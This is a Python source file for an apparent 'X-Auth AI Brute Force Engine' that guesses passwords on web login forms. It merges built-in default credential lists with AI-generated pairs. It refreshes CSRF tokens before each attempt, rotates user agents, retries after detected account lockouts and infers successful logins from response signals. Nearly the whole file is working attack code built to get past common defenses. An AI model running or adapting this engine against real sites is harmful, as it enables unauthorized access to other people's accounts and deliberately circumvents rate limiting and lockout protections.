"""
brute_force.py — X-Auth AI Brute Force Engine  (exhaustive mode)

DESIGN INTENT:
  Run EVERY credential pair that is passed in — no silent truncation.
  The caller (main.py / wordlist_merger) decides how many pairs to
  generate; this engine just runs all of them.

  Merge order (priority preserved, but nothing dropped):
    1. PRIORITY_CREDENTIALS  — common defaults, always tried first
    2. extra_creds            — AI / user-supplied pairs
    3. CREDENTIAL_DATABASE    — extended built-in fallback

  MAX_BRUTE_ATTEMPTS from .env is used ONLY as a safety ceiling
  for runaway wordlists (e.g. 100,000+ pairs).  For normal usage
  (AI=150 passwords × 5 usernames = 750 pairs) it will never trigger.
  Set it to 999999 in .env to effectively disable the cap.
"""

import requests
import time
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
from rich.table import Table

try:
    from core.config import TARGET_TIMEOUT, SESSION_DELAY, MAX_BRUTE_ATTEMPTS
    from core.logger import logger
except ImportError:
    TARGET_TIMEOUT      = 10
    SESSION_DELAY       = 0.3
    MAX_BRUTE_ATTEMPTS  = 999999   # effectively no cap when running standalone
    import logging
    logger = logging.getLogger(__name__)

console = Console()
ua      = UserAgent()

# ─────────────────────────────────────────────────────────────────────────────
# PRIORITY CREDENTIALS — tried first in every run
# ─────────────────────────────────────────────────────────────────────────────
PRIORITY_CREDENTIALS = [
    ("admin",    "admin"),
    ("admin",    "password"),
    ("admin",    "admin123"),
    ("admin",    "password123"),
    ("admin",    "123456"),
    ("admin",    ""),
    ("admin",    "pass"),
    ("admin",    "letmein"),
    ("admin",    "qwerty"),
    ("admin",    "root"),
    ("root",     "root"),
    ("root",     "toor"),
    ("root",     "password"),
    ("admin",    "toor"),
    ("admin",    "test"),
    ("test",     "test"),
    ("guest",    "guest"),
    ("user",     "user"),
    ("admin",    "welcome"),
    ("admin",    "changeme"),
    ("admin",    "secret"),
    ("admin",    "default"),
    ("admin",    "P@ssw0rd"),
    ("admin",    "Admin@123"),
    ("admin",    "admin@123"),
]

# ─────────────────────────────────────────────────────────────────────────────
# CREDENTIAL DATABASE — extended fallback list
# ─────────────────────────────────────────────────────────────────────────────
CREDENTIAL_DATABASE = [
    ("admin",         "passw0rd"),
    ("admin",         "p@ssword"),
    ("admin",         "p@ss"),
    ("admin",         "P@ssword1"),
    ("admin",         "admin1"),
    ("admin",         "admin2"),
    ("admin",         "1234567890"),
    ("admin",         "qwerty123"),
    ("admin",         "iloveyou"),
    ("admin",         "princess"),
    ("admin",         "rockyou"),
    ("admin",         "batman"),
    ("admin",         "superman"),
    ("admin",         "trustno1"),
    ("admin",         "000000"),
    ("admin",         "111111"),
    ("admin",         "123123"),
    ("admin",         "654321"),
    ("admin",         "666666"),
    ("admin",         "121212"),
    ("admin",         "pass123"),
    ("admin",         "pass1234"),
    ("admin",         "secure"),
    ("admin",         "blank"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("administrator", "admin"),
    ("superadmin",    "superadmin"),
    ("superadmin",    "password"),
    ("webadmin",      "webadmin"),
    ("webadmin",      "password"),
    ("sysadmin",      "sysadmin"),
    ("sysadmin",      "password"),
    ("manager",       "manager"),
    ("manager",       "password"),
    ("operator",      "operator"),
    ("operator",      "password"),
    ("support",       "support"),
    ("support",       "password"),
    ("demo",          "demo"),
    ("demo",          "password"),
    ("test",          "password"),
    ("test",          "123456"),
    ("guest",         "password"),
    ("user",          "password"),
    ("user",          "123456"),
    ("mysql",         "mysql"),
    ("mysql",         "password"),
    ("postgres",      "postgres"),
    ("postgres",      "password"),
    ("ftp",           "ftp"),
    ("ftp",           "password"),
    ("anonymous",     "anonymous"),
    ("anonymous",     ""),
]

# ─────────────────────────────────────────────────────────────────────────────
# DETECTION KEYWORD SETS
# ─────────────────────────────────────────────────────────────────────────────
LOCKOUT_KEYWORDS = {
    "account locked", "too many attempts", "temporarily blocked",
    "rate limit", "account suspended",
}
FAILURE_KEYWORDS = {
    "invalid", "incorrect", "failed", "error", "unsuccessful",
    "wrong", "denied", "bad credentials", "login failed",
}
SUCCESS_KEYWORDS = {
    "logout", "log out", "sign out", "welcome", "dashboard",
    "profile", "account", "logged in", "dvwa",
}


# ─────────────────────────────────────────────────────────────────────────────
# WORDLIST BUILDER  — exhaustive, nothing dropped except true duplicates
# ─────────────────────────────────────────────────────────────────────────────
def build_full_wordlist(extra_creds: list) -> list:
    """
    Merges all credential sources into one deduplicated list.

    Order:
      1. PRIORITY_CREDENTIALS
      2. extra_creds  (AI-generated / user-supplied tuples)
      3. CREDENTIAL_DATABASE

    No entry is ever dropped except exact (user, password) duplicates.
    The MAX_BRUTE_ATTEMPTS ceiling is applied LAST as a pure safety guard.

    Returns:
        list of (username, password) tuples — every pair, in priority order.
    """
    seen:   set  = set()
    result: list = []

    all_sources = (
        PRIORITY_CREDENTIALS
        + list(extra_creds or [])
        + CREDENTIAL_DATABASE
    )

    for pair in all_sources:
        # Normalise — accept list/tuple of length 2
        if not isinstance(pair, (list, tuple)) or len(pair) != 2:
            logger.warning(f"[BruteForce] Skipping malformed entry: {pair!r}")
            continue
        pair = (str(pair[0]), str(pair[1]))

        if pair not in seen:
            seen.add(pair)
            result.append(pair)

    # Safety ceiling only — in normal use this should never truncate
    if len(result) > MAX_BRUTE_ATTEMPTS:
        logger.warning(
            f"[BruteForce] Wordlist has {len(result)} pairs — "
            f"truncating to MAX_BRUTE_ATTEMPTS={MAX_BRUTE_ATTEMPTS}. "
            f"Raise MAX_BRUTE_ATTEMPTS in .env to run all pairs."
        )
        result = result[:MAX_BRUTE_ATTEMPTS]

    return result


# ─────────────────────────────────────────────────────────────────────────────
# ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class BruteForceEngine:
    def __init__(self, target_dict: dict):
        self.target   = target_dict
        self.session  = requests.Session()
        self.session.headers["User-Agent"] = ua.random
        self.baseline = {}

    # ── CSRF / token helpers ──────────────────────────────────────────────────
    def _get_fresh_inputs(self) -> dict:
        """
        GET the login page and return ALL input field values.
        Called before EVERY POST so CSRF tokens are always fresh.
        """
        try:
            resp = self.session.get(
                self.target["source_page"],
                timeout=TARGET_TIMEOUT,
                verify=False,
                allow_redirects=True,
            )
            soup   = BeautifulSoup(resp.text, "lxml")
            inputs = {}
            for inp in soup.find_all("input"):
                name  = inp.get("name")
                value = inp.get("value", "")
                if name:
                    inputs[name] = value
            return inputs
        except Exception as exc:
            logger.error(f"[BruteForce] Token fetch failed: {exc}")
            return {}

    # ── Baseline ──────────────────────────────────────────────────────────────
    def _establish_baseline(self):
        """
        Send a guaranteed-invalid login to fingerprint the failure response.
        Records URL, body length, status code, and body text for later
        comparison by _is_success().
        """
        inputs = self._get_fresh_inputs()
        inputs[self.target["username_field"]] = "__xauth_baseline_user__"
        inputs[self.target["password_field"]] = "__xauth_baseline_pass__"

        try:
            resp = self.session.post(
                self.target["action"],
                data=inputs,
                timeout=TARGET_TIMEOUT,
                verify=False,
                allow_redirects=True,
            )
            self.baseline = {
                "url":         resp.url,
                "length":      len(resp.text),
                "status":      resp.status_code,
                "body_sample": resp.text.lower(),
            }
            console.print(
                f"[dim]  Baseline: HTTP {resp.status_code} "
                f"| {len(resp.text)} bytes "
                f"| {resp.url}[/dim]"
            )
        except Exception as exc:
            logger.critical(f"[BruteForce] Baseline failed — using defaults: {exc}")
            self.baseline = {
                "url":         self.target["action"],
                "length":      1000,
                "status":      200,
                "body_sample": "invalid",
            }

    # ── Success detection ─────────────────────────────────────────────────────
    def _is_success(self, resp) -> bool:
        """
        Five independent signals — any one firing means login succeeded.

        Signal 1: Final URL moved away from the login page.
        Signal 2: HTTP redirect history pointed to a non-login path.
        Signal 3: Success keywords appeared that were absent in the baseline.
        Signal 4: Failure keywords that WERE in the baseline disappeared.
        Signal 5: Response body is >= 2x the baseline size.
        """
        body_lower    = resp.text.lower()
        baseline_url  = self.baseline.get("url", "")
        baseline_body = self.baseline.get("body_sample", "")

        # Signal 1 — URL redirect
        if resp.url != baseline_url and "login" not in resp.url.lower():
            return True

        # Signal 2 — explicit HTTP redirect
        for r in resp.history:
            if r.status_code in (301, 302, 303):
                dest = r.headers.get("Location", "").lower()
                if dest and "login" not in dest and dest not in ("/", ""):
                    return True

        # Signal 3 — success keywords appeared
        if any(kw in body_lower for kw in SUCCESS_KEYWORDS):
            if not any(kw in baseline_body for kw in SUCCESS_KEYWORDS):
                return True

        # Signal 4 — failure keywords disappeared
        baseline_had_failure = any(kw in baseline_body for kw in FAILURE_KEYWORDS)
        if baseline_had_failure and not any(kw in body_lower for kw in FAILURE_KEYWORDS):
            return True

        # Signal 5 — page dramatically larger
        baseline_len = self.baseline.get("length", 0)
        if baseline_len and len(resp.text) >= baseline_len * 2.0:
            return True

        return False

    # ── Main attack loop ──────────────────────────────────────────────────────
    def run(self, creds: list):
        """
        Tries every pair in `creds`.
        Stops immediately on first success.
        Returns (found_dict | None, total_attempts_made).
        """
        self._establish_baseline()

        found    = None
        attempts = 0
        total    = len(creds)

        console.print(
            f"[bold red]  Starting exhaustive brute force — "
            f"{total} pairs to try[/bold red]\n"
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
            transient=False,
        ) as progress:
            task = progress.add_task("[cyan]Brute-forcing...", total=total)

            i = 0
            while i < total:
                user, pwd = creds[i]
                attempts += 1

                # Rotate user-agent every 10 requests
                if attempts % 10 == 0:
                    self.session.headers["User-Agent"] = ua.random

                # Fresh CSRF token before every POST
                form_data = self._get_fresh_inputs()
                form_data[self.target["username_field"]] = user
                form_data[self.target["password_field"]] = pwd

                try:
                    resp = self.session.post(
                        self.target["action"],
                        data=form_data,
                        timeout=TARGET_TIMEOUT,
                        verify=False,
                        allow_redirects=True,
                    )

                    body_lower = resp.text.lower()

                    # Lockout detected — back off and RETRY same credential
                    if any(kw in body_lower for kw in LOCKOUT_KEYWORDS):
                        console.print(
                            "\n[bold yellow]⚠  LOCKOUT DETECTED — "
                            "cooling down 60 s then retrying...[/bold yellow]"
                        )
                        time.sleep(60)
                        continue   # do NOT advance i

                    # Success check
                    if self._is_success(resp):
                        found = {
                            "username": user,
                            "password": pwd,
                            "attempt":  attempts,
                            "url":      resp.url,
                        }
                        progress.update(task, advance=1)
                        break

                except requests.exceptions.Timeout:
                    logger.warning(f"[BruteForce] Timeout at attempt {attempts} ({user})")
                except Exception as exc:
                    logger.warning(f"[BruteForce] Error at attempt {attempts}: {exc}")

                progress.update(
                    task,
                    advance=1,
                    description=(
                        f"[cyan]Trying [white]{user}[/white]"
                        f":[dim]{pwd[:16]}[/dim]"
                    ),
                )
                i += 1
                time.sleep(SESSION_DELAY + random.uniform(0, 0.15))

        self._print_summary(found, attempts, total)
        return found, attempts

    # ── Summary table ─────────────────────────────────────────────────────────
    def _print_summary(self, found, attempts, total):
        table = Table(title="Brute Force Summary", border_style="bright_blue")
        table.add_column("Metric", style="cyan")
        table.add_column("Result", style="white")

        table.add_row("Total Pairs in Wordlist", str(total))
        table.add_row("Attempts Made",           str(attempts))

        if found:
            table.add_row("Status",    "[bold green]✔  SUCCESS[/bold green]")
            table.add_row("Username",  found["username"])
            table.add_row("Password",  found["password"])
            table.add_row("Attempt #", str(found["attempt"]))
            table.add_row("Final URL", found["url"])
        else:
            table.add_row(
                "Status",
                f"[yellow]✘  Exhausted all {total} pairs — no credentials found[/yellow]",
            )

        console.print(table)


# ─────────────────────────────────────────────────────────────────────────────
# PUBLIC API
# ─────────────────────────────────────────────────────────────────────────────
def brute_force(target: dict, extra_credentials: list = None) -> dict:
    """
    Entry point called by main.py.

    Builds the full wordlist (every pair, nothing dropped except duplicates),
    runs all of them, and returns results.

    Args:
        target:            form dict from form_parser
        extra_credentials: (user, pwd) tuples from AI guesser / wordlist_merger

    Returns:
        {
            "target":      str,
            "found":       bool,
            "credentials": dict | None,
            "attempts":    int,
        }
    """
    console.print(f"\n[bold red]Brute force:[/bold red] {target['action']}")

    creds = build_full_wordlist(extra_credentials or [])

    console.print(
        f"[dim]  Wordlist composition: "
        f"{len(PRIORITY_CREDENTIALS)} priority + "
        f"{len(extra_credentials or [])} AI pairs + "
        f"{len(CREDENTIAL_DATABASE)} built-in "
        f"= {len(creds)} unique pairs total[/dim]\n"
    )

    engine = BruteForceEngine(target)
    found, attempts = engine.run(creds)

    return {
        "target":      target["action"],
        "found":       found is not None,
        "credentials": found,
        "attempts":    attempts,
    }